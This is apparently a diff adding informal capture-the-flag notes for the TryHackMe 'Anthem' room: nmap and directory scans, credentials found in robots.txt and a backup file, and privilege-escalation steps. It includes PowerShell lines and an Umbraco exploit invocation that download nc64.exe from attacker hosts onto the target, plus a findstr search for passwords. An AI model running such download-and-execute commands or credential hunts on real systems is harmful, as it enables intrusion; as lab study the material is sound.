@@ -1,0 +1,301 @@
+Jane Doe
+
+Anthem.com
+
+Website: THM{L0L_WH0_D15}
+
+JD@anthem.com
+
+Born on a Monday,
+Christened on Tuesday,
+Married on Wednesday,
+Took ill on Thursday,
+Grew worse on Friday,
+Died on Saturday,
+Buried on Sunday.
+
+James Orchard Halliwell
+
+everyhting is in inspect element.
+
+http://10.10.79.94/metaweblog/1073
+
+=====================================================================================================================================================================
+robots.txt:-
+
+UmbracoIsTheBest!
+
+# Use for all search robots
+User-agent: *
+
+# Define the directories not to crawl
+Disallow: /bin/
+Disallow: /config/
+Disallow: /umbraco/
+Disallow: /umbraco_client/
+
+=====================================================================================================================================================================
+
+
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 4 disallowed entries 
+|_/bin/ /config/ /umbraco/ /umbraco_client/
+|_http-title: Anthem.com - Welcome to our blog
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WIN-LU09299160F
+|   NetBIOS_Domain_Name: WIN-LU09299160F
+|   NetBIOS_Computer_Name: WIN-LU09299160F
+|   DNS_Domain_Name: WIN-LU09299160F
+|   DNS_Computer_Name: WIN-LU09299160F
+|   Product_Version: 10.0.17763
+|_  System_Time: 2020-08-30T20:23:04+00:00
+| ssl-cert: Subject: commonName=WIN-LU09299160F
+| Issuer: commonName=WIN-LU09299160F
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-04-04T22:56:38
+| Not valid after:  2020-10-04T22:56:38
+| MD5:   2814 61de 95b7 e9b5 4789 3027 7f1f 60d2
+|_SHA-1: d47d 2a8f 6143 b820 936e 4120 cdd1 9ddc 5385 d285
+|_ssl-date: 2020-08-30T20:23:12+00:00; -2s from scanner time.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1511 (90%), Microsoft Windows 10 1703 (90%), Microsoft Windows Server 2008 R2 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+====================================================================================================================================================================
+
+
+┌─[mayomacam@parrot]─[~/tryhackme/challange/anthem]
+└──╼ $nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.10.230.239
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 01:59 IST
+Nmap scan report for 10.10.230.239
+Host is up (0.39s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+| rdp-enum-encryption: 
+|   Security layer
+|     CredSSP (NLA): SUCCESS
+|     CredSSP with Early User Auth: SUCCESS
+|     RDSTLS: SUCCESS
+|     SSL: SUCCESS
+|_  RDP Protocol Version:  RDP 10.6 server
+| rdp-ntlm-info: 
+|   Target_Name: WIN-LU09299160F
+|   NetBIOS_Domain_Name: WIN-LU09299160F
+|   NetBIOS_Computer_Name: WIN-LU09299160F
+|   DNS_Domain_Name: WIN-LU09299160F
+|   DNS_Computer_Name: WIN-LU09299160F
+|   Product_Version: 10.0.17763
+|_  System_Time: 2020-08-30T20:29:10+00:00
+
+Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds
+
+
+====================================================================================================================================================================
+
+
+Target: 10.10.55.242
+
+[04:47:48] Starting: 
+[04:47:50] 403 -  312B  - /%2e%2e/google.com
+[04:47:51] 400 -    3KB - /%3f/
+[04:50:32] 301 -  118B  - /archive  ->  /
+[04:50:36] 200 -    4KB - /authors
+[04:50:39] 400 -   46B  - /base/
+[04:50:43] 200 -    5KB - /blog
+[04:50:43] 200 -    5KB - /Blog
+[04:50:47] 200 -    3KB - /categories
+[04:52:59] 302 -  126B  - /INSTALL  ->  /umbraco/
+[04:52:59] 302 -  126B  - /install  ->  /umbraco/
+[04:52:59] 302 -  126B  - /Install  ->  /umbraco/
+[04:53:00] 302 -  126B  - /install/  ->  /umbraco/
+[04:55:21] 200 -  192B  - /robots.txt
+[04:55:22] 200 -    2KB - /rss
+[04:55:24] 200 -    3KB - /search
+[04:55:24] 200 -    3KB - /Search
+[04:55:32] 200 -    1KB - /sitemap
+[04:55:46] 200 -    4KB - /tags
+[04:55:58] 403 -    2KB - /Trace.axd
+[04:56:00] 400 -    3KB - Trace.axd::$DATA
+[04:56:04] 200 -    6KB - /umbraco/webservices/codeEditorSave.asmx
+[04:56:22] 400 -    3KB - web.config::$DATA
+
+Task Completed
+
+====================================================================================================================================================================
+
+Target: 10.10.55.242/umbraco/
+
+[04:59:25] Starting: 
+[04:59:34] 400 -    3KB - /umbraco/%3f/
+[05:00:17] 301 -  159B  - /umbraco/actions  ->  http://10.10.55.242/umbraco/actions/
+[05:00:38] 200 -    4KB - /umbraco/application/cache/
+[05:00:38] 200 -    4KB - /umbraco/application/logs/
+[05:00:39] 301 -  158B  - /umbraco/assets  ->  http://10.10.55.242/umbraco/assets/
+[05:00:50] 301 -  158B  - /umbraco/config  ->  http://10.10.55.242/umbraco/config/
+[05:00:50] 301 -  158B  - /umbraco/Config  ->  http://10.10.55.242/umbraco/Config/
+[05:00:51] 403 -    0B  - /umbraco/Config/
+[05:00:51] 403 -    0B  - /umbraco/config/
+[05:01:06] 200 -    4KB - /umbraco/default
+[05:01:06] 200 -    4KB - /umbraco/Default
+[05:01:07] 301 -  161B  - /umbraco/developer  ->  http://10.10.55.242/umbraco/developer/
+[05:02:03] 301 -  159B  - /umbraco/INSTALL  ->  http://10.10.55.242/umbraco/INSTALL/
+[05:02:03] 301 -  159B  - /umbraco/Install  ->  http://10.10.55.242/umbraco/Install/
+[05:02:03] 301 -  159B  - /umbraco/install  ->  http://10.10.55.242/umbraco/install/
+[05:02:04] 403 -    0B  - /umbraco/install/
+[05:02:10] 301 -  154B  - /umbraco/js  ->  http://10.10.55.242/umbraco/js/
+[05:02:17] 301 -  155B  - /umbraco/lib  ->  http://10.10.55.242/umbraco/lib/
+[05:02:17] 301 -  163B  - /umbraco/lib/tinymce  ->  http://10.10.55.242/umbraco/lib/tinymce/
+[05:02:17] 403 -    0B  - /umbraco/lib/tinymce/
+[05:02:38] 301 -  159B  - /umbraco/members  ->  http://10.10.55.242/umbraco/members/
+[05:02:38] 301 -  159B  - /umbraco/Members  ->  http://10.10.55.242/umbraco/Members/
+[05:02:39] 403 -    0B  - /umbraco/members/
+[05:03:32] 301 -  159B  - /umbraco/plugins  ->  http://10.10.55.242/umbraco/plugins/
+[05:03:56] 301 -  158B  - /umbraco/search  ->  http://10.10.55.242/umbraco/search/
+[05:03:56] 301 -  158B  - /umbraco/Search  ->  http://10.10.55.242/umbraco/Search/
+[05:04:04] 301 -  160B  - /umbraco/settings  ->  http://10.10.55.242/umbraco/settings/
+[05:04:05] 403 -    0B  - /umbraco/settings/
+[05:04:43] 403 -    2KB - /umbraco/Trace.axd
+[05:04:45] 400 -    3KB - Trace.axd::$DATA
+[05:05:03] 400 -    3KB - web.config::$DATA
+
+====================================================================================================================================================================
+
+
+
+
+
+====================================================================================================================================================================
+
+password is in robots.txt.
+ans user was poem related auther.
+
+====================================================================================================================================================================
+
+
+sg@anthem.com
+UmbracoIsTheBest!
+
+====================================================================================================================================================================
+invoke-webrequest -Uri http://10.10.14.52/nc64.exe -OutFile C:\windows\system32\inetsrv\nc.exe
+(New-Object System.Net.WebClient).DownloadFile("http://10.8.19.129:5000/nc64.exe", "C:\windows\system32\inetsrv\nc.exe")
+
+
+python exploit.py -u sg@anthem.com -p UmbracoIsTheBest! -i 'http://10.10.170.162/' -c powershell -a '-NoProfile -Command (New-Object System.Net.WebClient).DownloadFile("http://10.8.19.129:5000/nc64.exe", "C:\windows\system32\inetsrv\nc.exe") '
+
+not work.
+====================================================================================================================================================================
+using above exploit we get user names but we can't seems to download exploit on there.
+
+user=sg
+pass=UmbracoIsTheBest!
+domain=anthem.com
+
+====================================================================================================================================================================
+
+User accounts for \\WIN-LU09299160F
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+SG                       WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\SG> wmic qfe
+Caption                                     CSName           Description      FixComments  HotFixID   InstallDate  InstalledBy                    InstalledOn  Name  ServicePackInEffect  Status
+http://support.microsoft.com/?kbid=4537490  WIN-LU09299160F  Update                        KB4537490               WIN-LU09299160F\Administrator  4/5/2020
+http://support.microsoft.com/?kbid=4462930  WIN-LU09299160F  Update                        KB4462930               WIN-LU09299160F\Administrator  4/5/2020
+http://support.microsoft.com/?kbid=4512577  WIN-LU09299160F  Security Update               KB4512577                                              9/7/2019
+http://support.microsoft.com/?kbid=4537759  WIN-LU09299160F  Security Update               KB4537759               WIN-LU09299160F\Administrator  4/5/2020
+http://support.microsoft.com/?kbid=4539571  WIN-LU09299160F  Security Update               KB4539571               NT AUTHORITY\SYSTEM            4/5/2020
+http://support.microsoft.com/?kbid=4541331  WIN-LU09299160F  Update                        KB4541331               WIN-LU09299160F\Administrator  4/5/2020
+
+====================================================================================================================================================================
+
+PS C:\Users\SG> Get-ChildItem Env: | ft Key,Value
+
+Key                             Value
+---                             -----
+ALLUSERSPROFILE                 C:\ProgramData
+APPDATA                         C:\Users\SG\AppData\Roaming
+CLIENTNAME                      parrot
+CommonProgramFiles              C:\Program Files\Common Files
+CommonProgramFiles(x86)         C:\Program Files (x86)\Common Files
+CommonProgramW6432              C:\Program Files\Common Files
+COMPUTERNAME                    WIN-LU09299160F
+ComSpec                         C:\Windows\system32\cmd.exe
+DriverData                      C:\Windows\System32\Drivers\DriverData
+FPS_BROWSER_APP_PROFILE_STRING  Internet Explorer
+FPS_BROWSER_USER_PROFILE_STRING Default
+HOMEDRIVE                       C:
+HOMEPATH                        \Users\SG
+LOCALAPPDATA                    C:\Users\SG\AppData\Local
+LOGONSERVER                     \\WIN-LU09299160F
+NUMBER_OF_PROCESSORS            1
+OS                              Windows_NT
+Path                            C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsP...
+PATHEXT                         .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+PROCESSOR_ARCHITECTURE          AMD64
+PROCESSOR_IDENTIFIER            Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
+PROCESSOR_LEVEL                 6
+PROCESSOR_REVISION              4f01
+ProgramData                     C:\ProgramData
+ProgramFiles                    C:\Program Files
+ProgramFiles(x86)               C:\Program Files (x86)
+ProgramW6432                    C:\Program Files
+PSModulePath                    C:\Users\SG\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\M...
+PUBLIC                          C:\Users\Public
+SESSIONNAME                     RDP-Tcp#0
+SystemDrive                     C:
+SystemRoot                      C:\Windows
+TEMP                            C:\Users\SG\AppData\Local\Temp\2
+TMP                             C:\Users\SG\AppData\Local\Temp\2
+USERDOMAIN                      WIN-LU09299160F
+USERDOMAIN_ROAMINGPROFILE       WIN-LU09299160F
+USERNAME                        SG
+USERPROFILE                     C:\Users\SG
+windir                          C:\Windows
+====================================================================================================================================================================
+
+PS C:\Users\SG> findstr /SI /M "password" *.xml *.ini *.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Apps_{1745e207-e910-4b3c-a278-7dbd76419783}\0.0.filtertrie.intermediate.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Apps_{6c87f318-7b6b-4779-a99f-b0be29d7f5cd}\0.0.filtertrie.intermediate.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Apps_{7e72fc14-dd44-4582-b5aa-f7887dab928d}\0.0.filtertrie.intermediate.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{7d7dd425-8ac9-4c9c-b4f1-76496b6a13cb}\appsglobals.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{7d7dd425-8ac9-4c9c-b4f1-76496b6a13cb}\appssynonyms.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{7d7dd425-8ac9-4c9c-b4f1-76496b6a13cb}\settingsglobals.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{7d7dd425-8ac9-4c9c-b4f1-76496b6a13cb}\settingssynonyms.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Settings_{c747ad42-db2b-419a-949f-0380241e44b5}\0.0.filtertrie.intermediate.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Settings_{dadc562c-bf58-4e2c-b4de-619dcdab1e8b}\0.0.filtertrie.intermediate.txt
+AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\SettingsCache.txt
+AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+====================================================================================================================================================================
+
+after showing hidden files i got a backup folder in c:\.
+
+there is a restore file and we have all the permissions as sg users we are in admin group.
+
+changing permission of file to read the file.
+===============================================================================================================================================
+
+it's more like a password and it also has permission of administrator .
+
+ChangeMeBaby1MoreTime
+
+got pass.
+
+try to go into administrator folder and enter password we got enter and got flag.
+ChangeMeBaby1MoreTime
